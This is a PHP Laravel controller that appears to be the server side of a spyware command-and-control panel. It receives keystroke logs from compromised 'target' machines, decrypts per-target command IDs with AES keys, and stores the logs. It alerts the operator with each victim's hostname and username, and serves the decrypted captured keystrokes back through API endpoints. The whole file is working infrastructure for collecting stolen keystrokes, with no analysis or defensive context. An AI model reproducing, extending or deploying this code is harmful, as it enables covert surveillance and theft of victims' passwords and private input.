<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Keylogger;
use App\Models\Notification;
use App\Models\Target;
use Illuminate\Http\Request;

class KeyloggerController extends Controller
{
    public function post(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string',
            'log' => 'required|string',
            'command_id' => 'required|string',
            //'duration' => 'required|string',
            //'started_at' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if ($target)
        {
            $data['target_id'] = $data['id'];
            unset($data['id']);
            $data['command_id'] = openssl_decrypt(base64_decode($data['command_id']),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );
	        $data['log'] = base64_encode(openssl_encrypt(
                    $data['log'],
                    'AES-256-cbc',
                    $target->key,
                    OPENSSL_RAW_DATA,
                    $target->iv
                    ));
            /*$data['duration'] = openssl_decrypt(base64_decode($data['duration']),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );
            $data['started_at'] = openssl_decrypt(base64_decode($data['started_at']),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );*/

            Keylogger::create($data);

            Notification::create([
                'host' => $target->hostname . '\\' . $target->username,
                'action' => 'New key logs',
                'read' => false,
                'target_id' => $data['target_id']
            ]);
        }

        return response()->json([]);
    }

    public function getKeylogs(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if (!$target) 
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'failed',
                'data' => null
            ]);
        }

        $limit = $request->get('limit', 10);
        $keylogs = Keylogger::where('target_id', $data['id'])
            ->select('id', 'log', 'created_at')
            ->orderBy('id', 'desc')
            ->paginate($limit);

        $keylogs->getCollection()->transform(function ($keylog) use ($target) {
            $keylog->log = openssl_decrypt(base64_decode($keylog->log),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );
            
            return $keylog;
        });

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $keylogs
        ]);
    }

    public function getKeylog($id, Request $request)
    {
        $data = $request->validate([
            'target_id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['target_id'])->first();
        if (!$target)
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'Keylog not found',
                'data' => null
            ]);
        }

        $keylog = Keylogger::where('target_id', $data['target_id'])
            ->where('id', $id)
            ->select('id', 'log', 'created_at')
            ->first();
        if ($keylog)
        {
            $keylog->log = openssl_decrypt(base64_decode($keylog->log),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );

            return response()->json([
                'status' => 'success',
                'message' => 'success',
                'data' => $keylog
            ]);
        }

        return response()->json([
                'status' => 'failed',
                'message' => 'Keylog not found',
                'data' => null
            ]);
    }
}
